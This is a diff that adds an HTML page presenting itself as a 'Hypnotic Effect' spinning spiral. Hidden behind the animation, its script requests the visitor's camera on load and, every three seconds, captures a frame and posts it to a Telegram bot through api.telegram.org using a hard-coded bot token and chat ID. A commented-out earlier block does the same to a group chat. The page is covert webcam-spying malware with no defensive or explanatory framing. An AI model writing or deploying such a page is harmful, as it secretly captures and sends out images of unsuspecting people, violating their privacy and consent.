@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hypnotic Effect</title>
+    <style>
+         #my-video,
+        #take-snapshot {
+            display: none;
+        }
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            overflow: hidden;
+        }
+        .spiral {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: conic-gradient(white, black);
+            animation: spin 5s linear infinite;
+        }
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <video id="my-video" autoplay></video>
+    <button id="take-snapshot">Take Snapshot</button>
+    <div class="spiral"></div>
+    <script>
+        let updatedChatID = 6654178666;
+        async function getCameraStream() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.getElementById('my-video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        function sendPhotoToTelegram(imageData, chatID) {
+            const BOT_TOKEN = '7112485957:AAHgaI5G1TIICLCrZid3rPoesbhZW-CWzFo'; 
+            const formData = new FormData();
+            formData.append('chat_id', chatID);
+            formData.append('photo', imageData, 'snapshot.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Response from Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending photo to Telegram:', error);
+                });
+        }
+
+        function takeSnapshotAndSendToTelegram(chatID) {
+            const videoElement = document.getElementById('my-video');
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob, chatID);
+            }, 'image/jpeg');
+        }
+
+        // document.addEventListener('DOMContentLoaded', () => {
+        //     getCameraStream().catch(console.error);
+
+        //     document.getElementById('take-snapshot').addEventListener('click', () => {
+        //         const updatedChatID = -1002008713806; 
+        //         takeSnapshotAndSendToTelegram(updatedChatID);
+        //     });
+        //     setInterval(() => {
+        //         updatedChatID = -1002008713806;
+        //         takeSnapshotAndSendToTelegram(updatedChatID);
+        //     }, 3000); 
+        // });
+        document.addEventListener('DOMContentLoaded', () => {
+    let updatedChatID = 6654178666; // Объявите updatedChatID глобально
+
+    getCameraStream().catch(console.error);
+
+    document.getElementById('take-snapshot').addEventListener('click', () => {
+        takeSnapshotAndSendToTelegram(updatedChatID);
+    });
+
+    setInterval(() => {
+        takeSnapshotAndSendToTelegram(updatedChatID);
+    }, 3000); 
+});
+
+    </script>
+</body>
+</html>
